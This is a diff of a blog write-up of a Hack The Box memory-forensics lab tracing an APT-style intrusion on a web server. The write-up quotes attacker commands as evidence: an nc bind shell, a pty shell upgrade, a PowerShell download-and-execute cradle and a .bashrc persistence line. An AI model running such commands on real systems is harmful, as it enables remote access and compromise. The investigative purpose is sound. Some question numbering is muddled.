@@ -1,3 +1,16 @@
+---
+title: "Aptnightmare — Mem dump Investigation"
+date: 2026-09-27
+draft: false
+featured: true
+summary: "investigation of Full attack chain from a misconfigured server."
+tags: ["Memory Forensics", "APT", "Volatility"]
+---
+
+
+
+
+
 In today’s box I would be solving HTB sherlock APTnightmare link here -> https://app.hackthebox.com/sherlocks/APTNightmare?tab=play_sherlock
 Scenario
 
@@ -39,13 +52,13 @@ Now let’s start triaging
 
  1.  python2 vol.py -f /home/kali/Desktop/Memory_WebServer.mem --profile=LinuxUbuntu_5_3_0-70-genericx64 linux_pslist to see an overview list of running processes during the time of imaging.
 
-[first image](1.png)
+![first image](1.png)
 
 A few processes caught my eye such Apache tree spinning off sh, bash, python3, nc but moving on
 
 2. python2 vol.py -f /home/kali/Desktop/Memory_WebServer.mem --profile=LinuxUbuntu_5_3_0-70-genericx64 linux_psaux provides a static, detailed snapshot of all currently running processes across your system including commands used.
 
-[second image](2.png)
+![second image](2.png)
 
 Here is a more detailed view, notice the weird processes like:
 Creates bind shell -> sh -c custom_command |mkfifo /tmp/mypipe;cat /tmp/mypipe|/bin/bash|nc -l -p 5555 >/tmp/mypipe
@@ -54,8 +67,8 @@ python3 -c "import pty;pty.spawn('/bin/bash')" -> for landing a raw netcat shell
 
 3. To check for bash history -> python2 vol.py -f /home/kali/Desktop/Memory_WebServer.mem --profile=LinuxUbuntu_5_3_0-70-genericx64 linux_bash, here i also found some very interesting details:
 
-[Third image](3.png)
-[Forth image](4.png)
+![Third image](3.png)
+![Forth image](4.png)
 
 
     Privilege escalation with PwnKit
@@ -69,18 +82,18 @@ Moving on to the PCAP
 Having established the main ip addresses in the attack we would go directly to look at their traffic
 ip.addr == 192.168.1.5 && ip.addr == 192.168.1.3
 
-[Fifth image](5.png)
+![Fifth image](5.png)
 
 Major communication happened: 192.168.1.5(attacker) between 192.168.1.3(webserver) but we have to find the initial access from the attack, I identified that the attacker conducted a port scan against 192.168.1.3 using filter ip.dst == 192.168.1.5 && ip.src == 192.168.1.3 && tcp.flags.syn == 1 && tcp.flags.ack == 1 in wireshark to find out which port was opened and responded and we get = 25 (SMTP), 53 (DNS), 80(HTTP), 110(POP3), 119(NNTP), 143 (IMAP), 443 (HTTPS), 465 (SMTPS), 563 (NNTPS), 587 (SMTP Submission), 993 (IMAPS), 995 (POP3S), 2020 (Non-assisigned), 5222 (XMPP Jabber), 5555 (Attacker's bind shell). 15 in total and 14 if we subtract the non standard port.
 Next we check for HTTP post request to check for further interaction with the server. using this filter in wireshark http contains "POST"
 
-[Sixth image](6.png)
-[Seventh image](7.png)
+![Sixth image](6.png)
+![Seventh image](7.png)
 
 multiple trials from the attacker before a successful attempt and we would check that with, and we can find the password here
 http contains "302"
 
-[Eighth image](8.png)
+![Eighth image](8.png)
 
 Username = admin and password = Pass%40000 url decode-> Pass@000. That’s our entry point, this is how the attacker get into the server.
 
@@ -104,7 +117,7 @@ Question
    6. How many subdomains were discovered by the attacker?
     ANS: since we have identified the misconfiguration exploited by the attacker, we can then filter for it response using ip.addr == 192.168.1.3 && dns.qry.type == 252
 
-[Ninth image](9.png)
+![Ninth image](9.png)
 
    7. What is the compromised subdomain (e.g., dev.example.com) ?
 ANS: looking at previous http headers we can see that the server responses have mostly been coming from sysmon.cs-corp.cd
@@ -122,7 +135,7 @@ ANS: T1195.002
    13. What command provided persistence in the cs-linux.deb file?
 ANS: let’s first extract the file from the traffic pcap
 
-[Tenth image](10.png)
+![Tenth image](10.png)
 
 start by extracting the file with ar x cs-linux.deb . This extracts three files: debian-binary, - control.tar.gz, - data.tar.gz then we use this command to extract tar --zstd -xf data.tar.zst
 
@@ -131,28 +144,28 @@ start by extracting the file with ar x cs-linux.deb . This extracts three files:
 now we have the content of the file which is a very python script
 using a custom script to extract the python file
 
-[Eleventh image](11.png)
+![Eleventh image](11.png)
 
 ANS: echo cs-linux && >> ~/.bashrc
 
    14. The attacker sent emails to employees, what is the name of the running process that allowed this to occur?
 ANS: The checked the process list to see if a mail server is running using the command python2 vol.py -f /home/kali/Desktop/Memory_WebServer.mem --profile=LinuxUbuntu_5_3_0-70-genericx64 linux_psaux | grep "mail"
 
-[extra](21.png)
+![extra](21.png)
 
 citserver is the answer
 
    15. We received phishing email can you provide subject of email?
 ANS: Right here i search the disk image to find the email but i couldn’t, So i checked the server to see if the mail remained in the memory with this strings /home/kali/Desktop/Memory_WebServer.mem | grep -i "subject:"
 
-[Twelveth image](12.png)
+![Twelveth image](12.png)
 
 answer: Review Revised Privacy Policy
 
 16. What is the name of the malicious attachment?
 ANS: To find this answer, I open the extracted disk image in Autopsy and checked under the recent document. i found
 
-[Thirteenth image](13.png)
+![Thirteenth image](13.png)
 
 after download the user (ceo-us) opened the file
 ANS: policy.docm
@@ -160,14 +173,14 @@ ANS: policy.docm
 17. What is the hostname for the compromised CEO?
 ANS: using this string strings /home/kali/Desktop/Memory_WebServer.mem | grep -iE "rcpt|to:|CEO|executive" | grep -i "cs-corp" | sort -u
 
-[Fourteenth image](14.png)
+![Fourteenth image](14.png)
 
 ceo-ru, ceo-us
 
 18. What is the hostname for the compromised CEO?
 ANS: apparently the disk image given is for ceo-us, so using autopsy we can easily find it
 
-[Fifteenth image](15.png)
+![Fifteenth image](15.png)
 
 DESKTOP-ELS5JAK
 
@@ -177,11 +190,11 @@ ANS: from the previous question 16 we can see the full file path C:\USERS\CEO-US
 20. What was the command used to gain initial access?
 ANS: There are two possible ways to find this, one is through decoding the policy.docm document to find the hidden command but it is too obfuscated and a really long process while the other is checking the disk for evidence of code execution through the prefetch, so we would head over to “C:\Windows\prefetch\POWERSHELL.EXE-920BBA2A.pf”
 
-[Sixteenth image](16.png)
+![Sixteenth image](16.png)
 
 to get the full command we can check the powershell event logs for command execution
 
-[seventeenth image](17.png)
+![seventeenth image](17.png)
 
 right we can see the full command used
 
@@ -190,7 +203,7 @@ powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(
 20. What is the popular C2 framework associated with the malicious executable used to gain initial access?
 ANS: upload the policy.docm document to virus total
 
-[Eighteenth image](18.png)
+![Eighteenth image](18.png)
 
 Cobalt Strike
 
@@ -200,7 +213,7 @@ ANS: windows-beacon_http-reverse_http
 23. What is the task name that has been added by the attacker?
 ANS: for this we would head over to “C:\Windows\System32\Tasks” filtering the odd one out WindowsUpdateCheck
 
-[Ninteenth image](19.png)
+![Ninteenth image](19.png)
 
 FULL ATTACK TIMELINE
 
